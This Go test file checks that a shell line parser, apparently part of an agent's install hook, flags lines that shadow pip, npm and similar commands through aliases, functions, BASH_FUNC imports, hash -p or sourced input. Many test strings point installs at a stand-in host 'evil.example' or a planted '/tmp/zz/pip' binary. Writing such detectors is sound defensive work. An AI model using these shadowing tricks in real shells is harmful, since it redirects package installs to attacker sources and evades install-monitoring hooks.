package installread

import (
	"slices"
	"testing"
)

// READER-SHADOW-1 (ADR-0159 rounds 18 and 19): a line that installs and defines an alias or a function — of any name,
// in any form a shell resolves a command through — holds, in the line reader the server runs and so in alalanet-agent's
// hook; the same definitions with no install stay silent. Placeholders zz-pkg and evil.example only.
func TestReaderShadowHolds(t *testing.T) {
	const idx = "-i https://evil.example/simple"
	for _, line := range []string{
		"pip() { command pip --index-url https://evil.example/simple \"$@\"; }; pip install zz-pkg",
		"pip () {\n command pip " + idx + " \"$@\"\n}\npip install zz-pkg",
		"function pip { command pip " + idx + " \"$@\"; }; pip install zz-pkg",
		"function pip() ( command pip " + idx + " \"$@\" ); pip install zz-pkg",
		"alias pip='pip --index-url https://evil.example/simple'; pip install zz-pkg",
		"shopt -s expand_aliases\nalias pip='pip " + idx + "'\npip install zz-pkg",
		"alias -g x=1 npm='npm --registry=https://evil.example/'; npm i zz-pkg",
		"BASH_ALIASES[pip]='pip " + idx + "'; pip install zz-pkg",
		"BASH_CMDS[pip]=/tmp/zz/pip; pip install zz-pkg",
		"functions[pip]='command pip " + idx + " \"$@\"'; pip install zz-pkg",
		"commands[npx]=/tmp/zz/npx; npx -y zz-pkg",
		"hash -p /tmp/zz/pip pip; pip install zz-pkg",
		"enable -f ./zz.so pip; pip install zz-pkg",
		"pip3.12() { :; }; pip3.12 install zz-pkg",
		"python3() { :; }; python3 -m pip install zz-pkg",
		"sudo() { :; }; sudo pip install zz-pkg",
		"bash -c 'npx() { :; }; npx -y zz-pkg'",
		"uvx() { :; }\nuvx zz-pkg",
		// round 19: any name, and every form
		"alias ll='ls -la'; pip install zz-pkg",
		"myfunc() { :; }; pip install zz-pkg",
		"BASH_ALIASES[ll]='ls -la'; pip install zz-pkg",
		"x() { :; }; npm i zz-pkg",
		"echo $'a\\'b'; pip() { :; }; pip install zz-pkg",          // $'…' with \' inside
		"echo hi # don't\npip() { :; }\npip install zz-pkg",        // an apostrophe in a comment
		"cat <<EOF\ndon't\nEOF\npip() { :; }\npip install zz-pkg",  // in a here-document
		"cat <<'EOF'\npip() { :; }\nEOF\npip install zz-pkg",       // a here-document's body is read as commands
		"source /dev/stdin <<< 'pip() { :; }'; pip install zz-pkg", // the definition is data source runs
		"source <(echo 'pip() { :; }'); pip install zz-pkg",        // the walk reads the echoed script
		". /dev/fd/3 3<<< 'pip() { :; }'; pip install zz-pkg",
		"source /proc/self/fd/0 <<< 'pip() { :; }'; pip install zz-pkg",
		"builtin source /dev/stdin <<EOF\nx\nEOF\npip install zz-pkg",
		"source <<< 'x' zz; pip install zz-pkg",
		"env 'BASH_FUNC_pip%%=() { :; }' bash -c 'pip install zz-pkg'", // bash imports it from the environment
		"BASH_FUNC_pip%%='() { :; }' bash -c 'pip install zz-pkg'",
		"export 'BASH_FUNC_pip%%=() { :; }'; bash -c 'pip install zz-pkg'",
		"shopt -s expand_aliases\nalias x='pip install " + idx + "'\nx zz-pkg", // an alias whose value installs
		"alias x='pip install " + idx + "'",
		"hash pip=/tmp/zz/pip; pip install zz-pkg", // zsh
		"autoload -U zzfn; pip install zz-pkg",
		"shopt -s expand_aliases; pip install zz-pkg",
		"typeset -A aliases; aliases+=(pip x); pip install zz-pkg",
		"read -A functions <<< x; pip install zz-pkg",
		"pip ( ) { :; }; pip install zz-pkg",               // blanks inside the parentheses
		"source ./zz-in <<EOF\nx\nEOF\npip install zz-pkg", // source with a here-document (a link to its input)
		"source /dev/fd/3 3< zz.sh; pip install zz-pkg",    // a descriptor, no here-string
		"source /proc/self/fd/3 3< zz.sh; pip install zz-pkg",
		"x='BASH_FUNC_pip%%=() { :; }'; env \"$x\" bash -c 'pip install zz-pkg'", // the raw line: a variable's value
		"x='functions[pip]=:'; eval \"$x\"; pip install zz-pkg",
		"pip install zz-pkg; pip() { :; }",                   // after the install: no effect, a hold is conservative
		"alias python=python3; python -m pip install zz-pkg", // P3-L: honest, and holds
	} {
		tg, un, _, _ := ParseLine(line)
		if !slices.ContainsFunc(un, func(u string) bool { return UnreadCode(u) == "shadowed_command" }) {
			t.Errorf("%q: targets %v, unread %q; want shadowed_command", line, tg, un)
		}
		if Defines(line) == "" {
			t.Errorf("%q: Defines empty", line)
		}
	}
	for _, line := range []string{
		"pip install zz-pkg",
		"echo 'pip() { :; }' && pip install zz-pkg", // quoted: no definition
		`echo "x; pip() { :; }; function npx" && pip install zz-pkg`,
		`echo "alias pip=x" && pip install zz-pkg`,
		"echo $'pip() { :; }' && pip install zz-pkg",
		"echo hi # pip() { :; }\npip install zz-pkg", // a comment
		"alias pip=pip3", // defines, installs nothing
		"alias ll='ls -la'",
		"nvm() { echo; }",
		"function build { npm run build; }; build",
		"hash -r; pip install zz-pkg",
		"echo \\( pip \\) && pip install zz-pkg",
		"a=(); b=(x y); pip install zz-pkg", // arrays, not functions
		"source .venv/bin/activate && pip install zz-pkg",
		"pip install zz-pkg && echo commands functions aliases",
		"pip install 'zz-pkg[extra]>=1'",
		"source <(cat .env) && npx -y zz-pkg", // as source .env (the corpus's one change before this line)
	} {
		if _, un, _, _ := ParseLine(line); slices.ContainsFunc(un, func(u string) bool { return UnreadCode(u) == "shadowed_command" }) {
			t.Errorf("%q: unread %q, want no shadowed_command", line, un)
		}
	}
	for line, want := range map[string]string{
		"pip() { :; }":                       "pip()",
		"function zz { :; }":                 "function zz",
		"alias ll='ls -la'":                  "alias ll",
		"source /dev/stdin <<< x":            "source of its input",
		"source /dev/stdin":                  "source /dev/stdin",
		"env 'BASH_FUNC_x%%=() { :; }' bash": "BASH_FUNC_x%%",
		"echo BASH_FUNC_x":                   "BASH_FUNC_",
		"hash -p /tmp/zz/pip pip":            "hash -p /tmp/zz/pip pip",
		"echo 'pip() { :; }'":                "",
		"a=()":                               "",
		"functions[zz]=x":                    "functions[zz]", // the assignment word, before the raw line
	} {
		if got := Defines(line); got != want {
			t.Errorf("Defines(%q) = %q, want %q", line, got, want)
		}
	}
}
